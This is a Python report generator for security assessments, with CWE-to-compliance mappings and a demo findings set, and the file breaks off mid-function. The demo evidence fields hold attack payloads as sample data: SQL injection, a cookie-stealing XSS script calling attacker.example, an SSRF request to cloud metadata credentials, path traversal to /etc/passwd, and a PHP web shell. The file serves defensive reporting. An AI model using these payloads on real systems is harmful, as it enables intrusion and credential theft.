#!/usr/bin/env python3
"""AIBrain Workflow: Security Report Generator — produces professional security
assessment reports from scan findings data.

Report types:
  technical    — Full technical findings with evidence, CVSS, remediation
  executive    — Business-focused risk overview for leadership
  compliance   — Findings mapped to NIST 800-53, ISO 27001, PCI DSS, SOC2
  presentation — HTML slide deck for briefings (AIBrain dark theme)
  tracker      — Remediation tracker JSON for dashboard rendering
  all          — Generate every report type

CLI:
  python report_generator.py --input findings.json --type all --output-dir ./reports/
  python report_generator.py --demo --type technical
  python report_generator.py --input findings.json --type executive --dry-run
"""

import argparse
import json
import os
import sys
import hashlib
import urllib.request
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any

# P0-1 backfill (2026-04-11): route workflow execution through the harness
from aibrain.core.workflow_base import workflow_execute

# ---------------------------------------------------------------------------
# AIBrain integration
# ---------------------------------------------------------------------------
from aibrain_db import AIBRAIN_ROOT
API_BASE = os.environ.get("AIBRAIN_API", os.environ.get("AIBRAIN_API", "http://localhost:8001/api/agent"))
CONFIG = json.loads((AIBRAIN_ROOT / "config.json").read_text()) if (AIBRAIN_ROOT / "config.json").exists() else {}

# ---------------------------------------------------------------------------
# CWE → Compliance mapping  (OWASP Top 10 coverage + extras)
# ---------------------------------------------------------------------------
CWE_COMPLIANCE_MAP: dict[str, dict[str, str]] = {
    "CWE-89": {
        "name": "SQL Injection",
        "nist": "SI-10 (Information Input Validation)",
        "iso": "A.14.2.5 (Secure System Engineering Principles)",
        "pci": "6.5.1 (Injection Flaws)",
        "soc2": "CC6.1 (Logical and Physical Access Controls)",
    },
    "CWE-79": {
        "name": "Cross-Site Scripting (XSS)",
        "nist": "SI-10 (Information Input Validation)",
        "iso": "A.14.2.5 (Secure System Engineering Principles)",
        "pci": "6.5.7 (Cross-Site Scripting)",
        "soc2": "CC6.1 (Logical and Physical Access Controls)",
    },
    "CWE-287": {
        "name": "Improper Authentication",
        "nist": "IA-2 (Identification and Authentication)",
        "iso": "A.9.4.2 (Secure Log-on Procedures)",
        "pci": "8.1 (Identification and Authentication Policy)",
        "soc2": "CC6.1 (Logical and Physical Access Controls)",
    },
    "CWE-352": {
        "name": "Cross-Site Request Forgery (CSRF)",
        "nist": "SC-23 (Session Authenticity)",
        "iso": "A.14.2.5 (Secure System Engineering Principles)",
        "pci": "6.5.9 (Cross-Site Request Forgery)",
        "soc2": "CC6.1 (Logical and Physical Access Controls)",
    },
    "CWE-22": {
        "name": "Path Traversal",
        "nist": "AC-6 (Least Privilege)",
        "iso": "A.9.4.1 (Information Access Restriction)",
        "pci": "6.5.8 (Improper Access Control)",
        "soc2": "CC6.1 (Logical and Physical Access Controls)",
    },
    "CWE-798": {
        "name": "Hard-coded Credentials",
        "nist": "IA-5 (Authenticator Management)",
        "iso": "A.9.2.4 (Management of Secret Authentication Information)",
        "pci": "2.1 (Change Vendor Defaults)",
        "soc2": "CC6.1 (Logical and Physical Access Controls)",
    },
    "CWE-311": {
        "name": "Missing Encryption of Sensitive Data",
        "nist": "SC-28 (Protection of Information at Rest)",
        "iso": "A.10.1.1 (Policy on Use of Cryptographic Controls)",
        "pci": "3.4 (Render PAN Unreadable)",
        "soc2": "CC6.7 (Restriction of Data in Transmission / Storage)",
    },
    "CWE-434": {
        "name": "Unrestricted File Upload",
        "nist": "SI-10 (Information Input Validation)",
        "iso": "A.14.2.5 (Secure System Engineering Principles)",
        "pci": "6.5.1 (Injection Flaws)",
        "soc2": "CC6.1 (Logical and Physical Access Controls)",
    },
    "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "nist": "SC-7 (Boundary Protection)",
        "iso": "A.13.1.1 (Network Controls)",
        "pci": "6.5.10 (Broken Access Control)",
        "soc2": "CC6.6 (Security for Infrastructure and Software)",
    },
    "CWE-502": {
        "name": "Deserialization of Untrusted Data",
        "nist": "SI-10 (Information Input Validation)",
        "iso": "A.14.2.5 (Secure System Engineering Principles)",
        "pci": "6.5.1 (Injection Flaws)",
        "soc2": "CC6.1 (Logical and Physical Access Controls)",
    },
    "CWE-200": {
        "name": "Information Exposure",
        "nist": "AC-4 (Information Flow Enforcement)",
        "iso": "A.8.2.3 (Handling of Assets)",
        "pci": "6.5.6 (Information Leakage)",
        "soc2": "CC6.5 (Restriction of Information Access)",
    },
    "CWE-862": {
        "name": "Missing Authorization",
        "nist": "AC-3 (Access Enforcement)",
        "iso": "A.9.4.1 (Information Access Restriction)",
        "pci": "6.5.10 (Broken Access Control)",
        "soc2": "CC6.3 (Role-Based Access / Least Privilege)",
    },
    "CWE-863": {
        "name": "Incorrect Authorization",
        "nist": "AC-3 (Access Enforcement)",
        "iso": "A.9.4.1 (Information Access Restriction)",
        "pci": "6.5.10 (Broken Access Control)",
        "soc2": "CC6.3 (Role-Based Access / Least Privilege)",
    },
    "CWE-611": {
        "name": "XML External Entity (XXE)",
        "nist": "SI-10 (Information Input Validation)",
        "iso": "A.14.2.5 (Secure System Engineering Principles)",
        "pci": "6.5.1 (Injection Flaws)",
        "soc2": "CC6.1 (Logical and Physical Access Controls)",
    },
    "CWE-77": {
        "name": "Command Injection",
        "nist": "SI-10 (Information Input Validation)",
        "iso": "A.14.2.5 (Secure System Engineering Principles)",
        "pci": "6.5.1 (Injection Flaws)",
        "soc2": "CC6.1 (Logical and Physical Access Controls)",
    },
    "CWE-78": {
        "name": "OS Command Injection",
        "nist": "SI-10 (Information Input Validation)",
        "iso": "A.14.2.5 (Secure System Engineering Principles)",
        "pci": "6.5.1 (Injection Flaws)",
        "soc2": "CC6.1 (Logical and Physical Access Controls)",
    },
    "CWE-269": {
        "name": "Improper Privilege Management",
        "nist": "AC-6 (Least Privilege)",
        "iso": "A.9.2.3 (Management of Privileged Access Rights)",
        "pci": "7.1 (Limit Access by Business Need)",
        "soc2": "CC6.3 (Role-Based Access / Least Privilege)",
    },
    "CWE-732": {
        "name": "Incorrect Permission Assignment",
        "nist": "AC-6 (Least Privilege)",
        "iso": "A.9.2.3 (Management of Privileged Access Rights)",
        "pci": "7.1 (Limit Access by Business Need)",
        "soc2": "CC6.3 (Role-Based Access / Least Privilege)",
    },
    "CWE-306": {
        "name": "Missing Authentication for Critical Function",
        "nist": "IA-2 (Identification and Authentication)",
        "iso": "A.9.4.2 (Secure Log-on Procedures)",
        "pci": "8.1 (Identification and Authentication Policy)",
        "soc2": "CC6.1 (Logical and Physical Access Controls)",
    },
    "CWE-400": {
        "name": "Uncontrolled Resource Consumption",
        "nist": "SC-5 (Denial of Service Protection)",
        "iso": "A.12.1.3 (Capacity Management)",
        "pci": "6.5.6 (All Other Vulnerabilities)",
        "soc2": "CC7.1 (Infrastructure Monitoring)",
    },
    "CWE-522": {
        "name": "Insufficiently Protected Credentials",
        "nist": "IA-5 (Authenticator Management)",
        "iso": "A.9.2.4 (Management of Secret Authentication Information)",
        "pci": "8.2.1 (Strong Cryptography for Credential Storage)",
        "soc2": "CC6.1 (Logical and Physical Access Controls)",
    },
}

# Fallback for unmapped CWEs
CWE_COMPLIANCE_FALLBACK = {
    "nist": "SI-2 (Flaw Remediation)",
    "iso": "A.12.6.1 (Management of Technical Vulnerabilities)",
    "pci": "6.1 (Identify Security Vulnerabilities)",
    "soc2": "CC7.1 (Infrastructure Monitoring)",
}

# ---------------------------------------------------------------------------
# Severity helpers
# ---------------------------------------------------------------------------
SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
SEVERITY_LABELS = {"critical": "CRITICAL", "high": "HIGH", "medium": "MEDIUM", "low": "LOW", "info": "INFO"}


def severity_key(finding: dict) -> int:
    return SEVERITY_ORDER.get(finding.get("severity", "info").lower(), 99)


def sorted_findings(findings: list[dict]) -> list[dict]:
    return sorted(findings, key=severity_key)


def severity_badge(sev: str) -> str:
    s = sev.lower()
    icons = {"critical": "[!!!]", "high": "[!!]", "medium": "[!]", "low": "[.]", "info": "[i]"}
    return f"{icons.get(s, '[?]')} {SEVERITY_LABELS.get(s, sev.upper())}"


def cvss_rating(score: float) -> str:
    if score >= 9.0:
        return "Critical"
    if score >= 7.0:
        return "High"
    if score >= 4.0:
        return "Medium"
    if score >= 0.1:
        return "Low"
    return "None"


# ---------------------------------------------------------------------------
# ASCII severity chart
# ---------------------------------------------------------------------------
def severity_bar_chart(summary: dict, width: int = 40) -> str:
    categories = ["critical", "high", "medium", "low"]
    labels = {"critical": "Critical ", "high": "High     ", "medium": "Medium   ", "low": "Low      "}
    colors = {"critical": "#", "high": "=", "medium": "-", "low": "."}
    total = summary.get("total", 1) or 1
    lines = []
    lines.append("  Severity Distribution")
    lines.append("  " + "-" * (width + 18))
    for cat in categories:
        count = summary.get(cat, 0)
        bar_len = int((count / total) * width) if total else 0
        bar = colors[cat] * bar_len
        pct = (count / total * 100) if total else 0
        lines.append(f"  {labels[cat]} |{bar:<{width}}| {count:>3} ({pct:>5.1f}%)")
    lines.append("  " + "-" * (width + 18))
    lines.append(f"  Total: {summary.get('total', 0)} findings")
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Report ID
# ---------------------------------------------------------------------------
def report_id(target: str, report_type: str, date_str: str) -> str:
    h = hashlib.sha256(f"{target}-{report_type}-{date_str}".encode()).hexdigest()[:8].upper()
    return f"RPT-{h}"


# ---------------------------------------------------------------------------
# Demo / sample data
# ---------------------------------------------------------------------------
def demo_findings() -> dict:
    return {
        "target": "demo.example.com",
        "scan_date": datetime.now().strftime("%Y-%m-%d"),
        "scanner": "assessment pipeline",
        "findings": [
            {
                "id": "F-001",
                "title": "SQL Injection in login form",
                "severity": "critical",
                "cvss": 9.8,
                "description": "The login endpoint at /api/login accepts unsanitized user input in the username parameter, allowing an attacker to inject arbitrary SQL statements. This was confirmed by injecting a time-based blind payload that caused a measurable delay in the server response.",
                "evidence": "POST /api/login HTTP/1.1\nContent-Type: application/json\n\n{\"username\": \"admin' OR SLEEP(5)--\", \"password\": \"x\"}\n\nResponse time: 5,023ms (baseline: 45ms)",
                "remediation": "Use parameterized queries or prepared statements for all database interactions. Implement input validation to reject special characters in username fields. Deploy a Web Application Firewall (WAF) rule to block common SQL injection patterns.",
                "cwe": "CWE-89",
                "affected_url": "/api/login",
                "status": "open",
            },
            {
                "id": "F-002",
                "title": "Stored XSS in user profile bio",
                "severity": "critical",
                "cvss": 9.1,
                "description": "The user profile bio field does not sanitize HTML input before rendering. An attacker can inject JavaScript that executes in the context of any user who views the profile, enabling session hijacking and credential theft.",
                "evidence": "Profile bio payload: <script>fetch('https://attacker.example/steal?c='+document.cookie)</script>\n\nConfirmed execution in admin session via cookie exfiltration to controlled server.",
                "remediation": "Implement output encoding for all user-supplied data rendered in HTML. Use Content Security Policy (CSP) headers to restrict inline script execution. Sanitize input on both client and server side.",
                "cwe": "CWE-79",
                "affected_url": "/profile/edit",
                "status": "open",
            },
            {
                "id": "F-003",
                "title": "Broken authentication allows account takeover",
                "severity": "high",
                "cvss": 8.6,
                "description": "The password reset endpoint does not properly validate reset tokens. An attacker can enumerate valid tokens via brute force due to insufficient rate limiting and predictable token generation (6-digit numeric codes).",
                "evidence": "GET /api/reset?token=123456 — 200 OK (valid)\nGET /api/reset?token=000001 — 200 OK (different account)\n\nNo rate limiting observed after 10,000 requests in 4 minutes.",
                "remediation": "Generate cryptographically random reset tokens of at least 32 bytes. Implement rate limiting on the password reset endpoint (max 5 attempts per IP per hour). Add token expiration (15 minutes maximum). Require email verification before processing the reset.",
                "cwe": "CWE-287",
                "affected_url": "/api/reset",
                "status": "open",
            },
            {
                "id": "F-004",
                "title": "Missing CSRF protection on account deletion",
                "severity": "high",
                "cvss": 8.1,
                "description": "The account deletion endpoint accepts POST requests without CSRF token validation. An attacker can craft a malicious page that triggers account deletion when visited by an authenticated user.",
                "evidence": "POST /api/account/delete HTTP/1.1\nCookie: session=<victim_session>\n\nNo CSRF token required. Confirmed deletion via cross-origin form submission.",
                "remediation": "Implement CSRF tokens on all state-changing endpoints. Use SameSite=Strict cookie attribute. Require re-authentication for destructive actions like account deletion.",
                "cwe": "CWE-352",
                "affected_url": "/api/account/delete",
                "status": "open",
            },
            {
                "id": "F-005",
                "title": "Server-Side Request Forgery in URL preview",
                "severity": "high",
                "cvss": 7.5,
                "description": "The URL preview feature at /api/preview fetches arbitrary URLs server-side without restriction. An attacker can access internal services, cloud metadata endpoints, and private network resources.",
                "evidence": "POST /api/preview\n{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}\n\nResponse includes AWS IAM temporary credentials for the instance role.",
                "remediation": "Implement a URL allowlist for the preview feature. Block requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x). Use a dedicated egress proxy with restricted network access for URL fetching. Disable HTTP redirects in the fetch client.",
                "cwe": "CWE-918",
                "affected_url": "/api/preview",
                "status": "open",
            },
            {
                "id": "F-006",
                "title": "Directory traversal in file download endpoint",
                "severity": "high",
                "cvss": 7.4,
                "description": "The file download endpoint at /api/files/download does not properly sanitize the filename parameter, allowing path traversal sequences to read arbitrary files from the server filesystem.",
                "evidence": "GET /api/files/download?name=../../../etc/passwd HTTP/1.1\n\nResponse: root:x:0:0:root:/root:/bin/bash ...",
                "remediation": "Validate and sanitize file paths to prevent directory traversal. Use a whitelist of allowed download directories. Resolve the canonical path and verify it stays within the intended directory. Remove or encode path traversal sequences (../, ..\\ etc).",
                "cwe": "CWE-22",
                "affected_url": "/api/files/download",
                "status": "open",
            },
            {
                "id": "F-007",
                "title": "Hard-coded API key in JavaScript source",
                "severity": "high",
                "cvss": 7.2,
                "description": "A third-party API key is embedded directly in the client-side JavaScript bundle. The key grants access to payment processing functionality and can be extracted by any user viewing the page source.",
                "evidence": "File: /static/js/app.bundle.js\nLine 1842: const STRIPE_KEY = 'sk_test_EXAMPLE_KEY_REDACTED';\n\nKey type: Stripe secret key (sk_live prefix indicates production)",
                "remediation": "Remove all hard-coded credentials from client-side code immediately. Rotate the compromised key. Use server-side proxy endpoints for API calls requiring secret keys. Store secrets in environment variables or a secrets manager.",
                "cwe": "CWE-798",
                "affected_url": "/static/js/app.bundle.js",
                "status": "open",
            },
            {
                "id": "F-008",
                "title": "Sensitive data transmitted over unencrypted channel",
                "severity": "medium",
                "cvss": 6.5,
                "description": "Several API endpoints transmit authentication tokens and personal data over HTTP without TLS encryption. A network attacker can intercept credentials and session tokens via passive eavesdropping.",
                "evidence": "HTTP (not HTTPS) response to /api/login includes:\n- Set-Cookie: session=abc123def456 (no Secure flag)\n- Body contains: {\"token\": \"eyJhbG...\", \"user\": {\"email\": \"user@example.com\"}}",
                "remediation": "Enforce HTTPS on all endpoints via HTTP Strict Transport Security (HSTS). Set the Secure flag on all cookies. Redirect all HTTP requests to HTTPS. Configure TLS 1.2+ with strong cipher suites.",
                "cwe": "CWE-311",
                "affected_url": "/api/login",
                "status": "open",
            },
            {
                "id": "F-009",
                "title": "Missing authorization on admin API endpoints",
                "severity": "medium",
                "cvss": 6.3,
                "description": "Administrative API endpoints at /api/admin/* do not verify the caller's role. Any authenticated user can access admin functions including user management, configuration changes, and log access.",
                "evidence": "GET /api/admin/users HTTP/1.1\nCookie: session=<regular_user_session>\n\nResponse: 200 OK — full user list including emails, roles, and last login times.",
                "remediation": "Implement role-based access control (RBAC) on all admin endpoints. Verify the user's role on every request. Return 403 Forbidden for unauthorized access attempts. Log all admin access for audit purposes.",
                "cwe": "CWE-862",
                "affected_url": "/api/admin/users",
                "status": "open",
            },
            {
                "id": "F-010",
                "title": "Verbose error messages expose internal architecture",
                "severity": "medium",
                "cvss": 5.3,
                "description": "Application error responses include full stack traces, database connection strings, internal IP addresses, and framework version information. This aids attackers in mapping the internal architecture.",
                "evidence": "GET /api/nonexistent HTTP/1.1\n\nResponse includes:\n- Framework: Express 4.18.2\n- Database: PostgreSQL 15.3 at 10.0.1.50:5432\n- Internal path: /opt/app/src/routes/api.js:142",
                "remediation": "Implement custom error handlers that return generic error messages. Log detailed errors server-side only. Remove framework version headers (X-Powered-By). Never expose internal IPs, file paths, or database details in responses.",
                "cwe": "CWE-200",
                "affected_url": "/api/*",
                "status": "open",
            },
            {
                "id": "F-011",
                "title": "Unrestricted file upload allows web shell deployment",
                "severity": "medium",
                "cvss": 5.8,
                "description": "The file upload endpoint accepts files without validating the content type or file extension. An attacker can upload executable files (PHP, JSP, ASPX) that are served directly from the uploads directory.",
                "evidence": "POST /api/upload\nContent-Type: multipart/form-data\nFilename: shell.php\nContent: <?php system($_GET['cmd']); ?>\n\nUploaded to: /uploads/shell.php — executable via GET /uploads/shell.php?cmd=id",
                "remediation": "Validate file extensions against an allowlist. Check file content (magic bytes) matches the declared type. Store uploads outside the webroot. Serve uploaded files through a handler that sets Content-Disposition: attachment. Rename files to random UUIDs on upload.",
                "cwe": "CWE-434",
                "affected_url": "/api/upload",
                "status": "open",
            },
            {
                "id": "F-012",
                "title": "Insufficient rate limiting on authentication endpoints",
                "severity": "medium",
                "cvss": 5.3,
                "description": "Authentication endpoints do not implement rate limiting, allowing unlimited login attempts. An attacker can perform credential stuffing or brute force attacks without being blocked.",
                "evidence": "Sent 50,000 login attempts in 3 minutes from a single IP address.\nNo blocking, CAPTCHA, or rate limiting observed.\nResponse times remained consistent throughout.",
                "remediation": "Implement progressive rate limiting: 5 failed attempts → CAPTCHA, 10 failed → 15-minute lockout, 20 failed → account lock requiring admin reset. Use account-level and IP-level rate limiting. Implement login attempt logging and alerting.",
                "cwe": "CWE-400",
                "affected_url": "/api/login",
                "status": "open",
            },
            {
                "id": "F-013",
                "title": "Session tokens do not expire",
                "severity": "medium",
                "cvss": 4.8,
                "description": "Session tokens issued at login have no expiration. A stolen session token grants permanent access until the user explicitly logs out. Tested with a token issued 30 days ago that still grants full access.",
                "evidence": "Token issued: 2026-02-19T10:00:00Z\nTested: 2026-03-21T14:30:00Z (30 days later)\nGET /api/profile with original token → 200 OK, full access",
                "remediation": "Set session token expiration to a maximum of 24 hours for regular sessions and 15 minutes for elevated privilege sessions. Implement idle timeout (30 minutes). Rotate session tokens on privilege changes. Provide server-side session invalidation on logout.",
                "cwe": "CWE-613",
                "affected_url": "/api/*",
                "status": "open",
            },
            {
                "id": "F-014",
                "title": "HTTP security headers missing",
                "severity": "low",
                "cvss": 3.1,
                "description": "The application does not set recommended security headers including Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, and Referrer-Policy.",
                "evidence": "Response headers from GET /:\n- No Content-Security-Policy\n- No X-Frame-Options (clickjacking risk)\n- No X-Content-Type-Options (MIME sniffing)\n- No Referrer-Policy",
                "remediation": "Add security headers: Content-Security-Policy (restrict resource origins), X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Referrer-Policy: strict-origin-when-cross-origin, Permissions-Policy (restrict browser features).",
                "cwe": "CWE-693",
                "affected_url": "/*",
                "status": "open",
            },
            {
                "id": "F-015",
                "title": "Outdated TLS configuration allows weak ciphers",
                "severity": "low",
                "cvss": 2.6,
                "description": "The server accepts TLS connections with outdated cipher suites including TLS_RSA_WITH_AES_128_CBC_SHA. While not immediately exploitable, weak ciphers reduce the barrier for future cryptographic attacks.",
                "evidence": "nmap --script ssl-enum-ciphers -p 443 target\n\nAccepted weak ciphers:\n- TLS_RSA_WITH_AES_128_CBC_SHA (no forward secrecy)\n- TLS_RSA_WITH_AES_256_CBC_SHA (no forward secrecy)\n- TLS 1.0 enabled (deprecated)",
                "remediation": "Disable TLS 1.0 and 1.1. Remove CBC-mode ciphers. Configure only TLS 1.2+ with AEAD cipher suites (AES-GCM, ChaCha20-Poly1305). Enable forward secrecy (ECDHE key exchange). Use Mozilla's SSL Configuration Generator for recommended settings.",
                "cwe": "CWE-326",
                "affected_url": "https://demo.example.com",
                "status": "open",
            },
        ],
        "summary": {
            "total": 15,
            "critical": 2,
            "high": 5,
            "medium": 6,
            "low": 2,
        },
    }


# Add CWE-613 and CWE-693 and CWE-326 to the mapping for completeness
CWE_COMPLIANCE_MAP["CWE-613"] = {
    "name": "Insufficient Session Expiration",
    "nist": "AC-12 (Session Termination)",
    "iso": "A.9.4.2 (Secure Log-on Procedures)",
    "pci": "8.1.8 (Idle Session Timeout)",
    "soc2": "CC6.1 (Logical and Physical Access Controls)",
}
CWE_COMPLIANCE_MAP["CWE-693"] = {
    "name": "Protection Mechanism Failure",
    "nist": "SI-11 (Error Handling)",
    "iso": "A.14.1.2 (Securing Application Services)",
    "pci": "6.5.10 (Broken Access Control)",
    "soc2": "CC6.6 (Security for Infrastructure and Software)",
}
CWE_COMPLIANCE_MAP["CWE-326"] = {
    "name": "Inadequate Encryption Strength",
    "nist": "SC-13 (Cryptographic Protection)",
    "iso": "A.10.1.1 (Policy on Use of Cryptographic Controls)",
    "pci": "4.1 (Strong Cryptography for Transmission)",
    "soc2": "CC6.7 (Restriction of Data in Transmission / Storage)",
}


# ===================================================================
# REPORT GENERATORS
# ===================================================================


def generate_technical_report(data: dict, target_name: str) -> str:
    """Full technical security assessment report."""
    target = data.get("target", "Unknown Target")
    scan_date = data.get("scan_date", datetime.now().strftime("%Y-%m-%d"))
    findings = sorted_findings(data.get("findings", []))
    summary = data.get("summary", {})
    rid = report_id(target, "technical", scan_date)

    lines = []

    # --- Cover ---
    lines.append("=" * 72)
    lines.append(f"  SECURITY ASSESSMENT — TECHNICAL REPORT")
    lines.append(f"  {rid}")
    lines.append("=" * 72)
    lines.append("")
    lines.append(f"  Client:      {target_name}")
    lines.append(f"  Target:      {target}")
    lines.append(f"  Date:        {scan_date}")
    lines.append(f"  Prepared by: Security Assessment Pipeline")
    lines.append(f"  Classification: CONFIDENTIAL")
    lines.append("")
    lines.append("=" * 72)
    lines.append("")
    lines.append("")

    # --- Table of Contents ---
    lines.append("## Table of Contents")
    lines.append("")
    lines.append("1. Executive Summary")
    lines.append("2. Scope and Methodology")
    lines.append("3. Risk Overview")
    lines.append("4. Findings Summary")
    lines.append("5. Detailed Findings")
    lines.append("6. Appendix")
    lines.append("")
    lines.append("---")
    lines.append("")

    # --- 1. Executive Summary ---
    lines.append("## 1. Executive Summary")
    lines.append("")
    crit = summary.get("critical", 0)
    high = summary.get("high", 0)
    med = summary.get("medium", 0)
    low = summary.get("low", 0)
    total = summary.get("total", len(findings))
    lines.append(
        f"A comprehensive security assessment of {target_name} ({target}) was conducted "
        f"on {scan_date}. The assessment identified **{total} vulnerabilities**: "
        f"{crit} critical, {high} high, {med} medium, and {low} low severity. "
    )
    if crit > 0:
        lines.append(
            f"The presence of {crit} critical-severity finding(s) indicates significant risk "
            f"to the confidentiality, integrity, and availability of the application and its data. "
            f"Immediate remediation is strongly recommended before these vulnerabilities are "
            f"exploited by malicious actors."
        )
    elif high > 0:
        lines.append(
            f"While no critical vulnerabilities were found, the {high} high-severity finding(s) "
            f"represent substantial risk and should be addressed within the next 7 days."
        )
    else:
        lines.append(
            "No critical or high severity vulnerabilities were identified. The findings "
            "should be addressed as part of regular security maintenance."
        )
    lines.append("")
    lines.append("---")
    lines.append("")

    # --- 2. Scope & Methodology ---
    lines.append("## 2. Scope and Methodology")
    lines.append("")
    lines.append("### 2.1 Scope")
    lines.append("")
    lines.append(f"- **Target:** {target}")
    lines.append(f"- **Assessment type:** Application security assessment")
    lines.append(f"- **Date:** {scan_date}")
    lines.append(f"- **Approach:** Automated scanning with manual verification")
    lines.append("")
    lines.append("### 2.2 Methodology")
    lines.append("")
    lines.append("The assessment followed industry-standard methodology:")
    lines.append("")
    lines.append("1. **Reconnaissance** — target enumeration, service discovery, technology fingerprinting")
    lines.append("2. **Vulnerability scanning** — automated analysis using the assessment pipeline")
    lines.append("3. **Manual verification** — confirmation of automated findings, false positive elimination")
    lines.append("4. **Exploitation** — proof-of-concept development for confirmed vulnerabilities")
    lines.append("5. **Reporting** — documentation of findings with evidence and remediation guidance")
    lines.append("")
    lines.append("Testing was performed in accordance with OWASP Testing Guide v4.2 and PTES.")
    lines.append("")
    lines.append("---")
    lines.append("")

    # --- 3. Risk Overview ---
    lines.append("## 3. Risk Overview")
    lines.append("")
    lines.append("```")
    lines.append(severity_bar_chart(summary))
    lines.append("```")
    lines.append("")
    risk = "CRITICAL" if crit > 0 else "HIGH" if high > 0 else "MEDIUM" if med > 0 else "LOW"
    lines.append(f"**Overall Risk Rating: {risk}**")
    lines.append("")
    lines.append("---")
    lines.append("")

    # --- 4. Findings Summary ---
    lines.append("## 4. Findings Summary")
    lines.append("")
    lines.append("| ID | Title | Severity | CVSS | CWE | Status |")
    lines.append("|------|-------|----------|------|-----|--------|")
    for f in findings:
        sev = f.get("severity", "info").upper()
        lines.append(
            f"| {f.get('id', '-')} | {f.get('title', '-')} | {sev} "
            f"| {f.get('cvss', '-')} | {f.get('cwe', '-')} | {f.get('status', 'open').upper()} |"
        )
    lines.append("")
    lines.append("---")
    lines.append("")

    # --- 5. Detailed Findings ---
    lines.append("## 5. Detailed Findings")
    lines.append("")

    for i, f in enumerate(findings, 1):
        fid = f.get("id", f"F-{i:03d}")
        sev = f.get("severity", "info").lower()
        cvss_val = f.get("cvss", 0)
        cwe = f.get("cwe", "N/A")
        cwe_info = CWE_COMPLIANCE_MAP.get(cwe, {})

        lines.append(f"### 5.{i}  {fid} — {f.get('title', 'Untitled')}")
        lines.append("")
        lines.append(f"| Attribute | Value |")
        lines.append(f"|-----------|-------|")
        lines.append(f"| **Severity** | {severity_badge(sev)} |")
        lines.append(f"| **CVSS Score** | {cvss_val} ({cvss_rating(cvss_val)}) |")
        lines.append(f"| **CWE** | {cwe} — {cwe_info.get('name', 'See MITRE CWE database')} |")
        lines.append(f"| **Affected URL** | `{f.get('affected_url', 'N/A')}` |")
        lines.append(f"| **Status** | {f.get('status', 'open').upper()} |")
        lines.append("")

        lines.append("**Description:**")
        lines.append("")
        lines.append(f.get("description", "No description provided."))
        lines.append("")

        evidence = f.get("evidence", "")
        if evidence:
            lines.append("**Evidence:**")
            lines.append("")
            lines.append("```")
            lines.append(evidence)
            lines.append("```")
            lines.append("")

        lines.append("**Impact:**")
        lines.append("")
        impact_map = {
            "critical": "Successful exploitation could result in complete compromise of the application, unauthorized access to sensitive data, and potential lateral movement to connected systems.",
            "high": "Exploitation could lead to significant data exposure, unauthorized access to protected functionality, or disruption of service availability.",
            "medium": "This vulnerability could be combined with other findings to escalate impact, or exploited independently to access limited sensitive data or functionality.",
            "low": "While not immediately exploitable for significant impact, this finding weakens the overall security posture and may facilitate future attacks.",
        }
        lines.append(impact_map.get(sev, "Impact assessment requires further analysis."))
        lines.append("")

        lines.append("**Remediation:**")
        lines.append("")
        lines.append(f.get("remediation", "Consult vendor documentation for remediation guidance."))
        lines.append("")

        if cwe_info:
            lines.append("**Compliance References:**")
            lines.append("")
            lines.append(f"- NIST 800-53: {cwe_info.get('nist', 'N/A')}")
            lines.append(f"- ISO 27001: {cwe_info.get('iso', 'N/A')}")
            lines.append(f"- PCI DSS: {cwe_info.get('pci', 'N/A')}")
            lines.append(f"- SOC 2: {cwe_info.get('soc2', 'N/A')}")
            lines.append("")

        lines.append("---")
        lines.append("")

    # --- 6. Appendix ---
    lines.append("## 6. Appendix")
    lines.append("")
    lines.append("### 6.1 Tools Used")
    lines.append("")
    lines.append("- Automated security scanner (assessment pipeline)")
    lines.append("- Manual verification and exploitation tools")
    lines.append("- Network analysis utilities")
    lines.append("")
    lines.append("### 6.2 Severity Rating Scale")
    lines.append("")
    lines.append("| Rating | CVSS Range | Description |")
    lines.append("|--------|-----------|-------------|")
    lines.append("| Critical | 9.0 – 10.0 | Immediate exploitation risk, severe business impact |")
    lines.append("| High | 7.0 – 8.9 | Significant risk, should be remediated within 7 days |")
    lines.append("| Medium | 4.0 – 6.9 | Moderate risk, remediate within 30 days |")
    lines.append("| Low | 0.1 – 3.9 | Minor risk, remediate within 90 days |")
    lines.append("")
    lines.append("### 6.3 Disclaimer")
    lines.append("")
    lines.append(
        "This report represents a point-in-time assessment. New vulnerabilities may be "
        "introduced through code changes, configuration updates, or newly disclosed threats. "
        "Regular reassessment is recommended."
    )
    lines.append("")
    lines.append("---")
    lines.append(f"*Report generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | {rid}*")

    return "\n".join(lines)


# -------------------------------------------------------------------
def generate_executive_summary(data: dict, target_name: str) -> str:
    """One-page executive summary for leadership / non-technical stakeholders."""
    target = data.get("target", "Unknown Target")
    scan_date = data.get("scan_date", datetime.now().strftime("%Y-%m-%d"))
    findings = sorted_findings(data.get("findings", []))
    summary = data.get("summary", {})
    rid = report_id(target, "executive", scan_date)

    crit = summary.get("critical", 0)
    high = summary.get("high", 0)
    med = summary.get("medium", 0)
    low = summary.get("low", 0)
    total = summary.get("total", len(findings))

    lines = []
    lines.append("=" * 72)
    lines.append("  EXECUTIVE SECURITY SUMMARY")
    lines.append(f"  {rid}")
    lines.append("=" * 72)
    lines.append("")
    lines.append(f"  Client:  {target_name}")
    lines.append(f"  Target:  {target}")
    lines.append(f"  Date:    {scan_date}")
    lines.append(f"  Classification: CONFIDENTIAL — EXECUTIVE DISTRIBUTION ONLY")
    lines.append("")
    lines.append("=" * 72)
    lines.append("")
    lines.append("")

    # --- Risk Posture ---
    lines.append("## Risk Posture Overview")
    lines.append("")
    risk = "CRITICAL" if crit > 0 else "HIGH" if high > 0 else "MEDIUM" if med > 0 else "LOW"
    lines.append(f"**Current Risk Level: {risk}**")
    lines.append("")
    if risk == "CRITICAL":
        lines.append(
            f"The security assessment of {target_name} identified **{total} vulnerabilities**, "
            f"including **{crit} critical-severity issue(s)** that pose immediate risk to business "
            f"operations, data security, and regulatory compliance. Without remediation, these "
            f"vulnerabilities could be exploited to compromise customer data, disrupt services, "
            f"and result in significant financial and reputational damage."
        )
    elif risk == "HIGH":
        lines.append(
            f"The security assessment of {target_name} identified **{total} vulnerabilities**. "
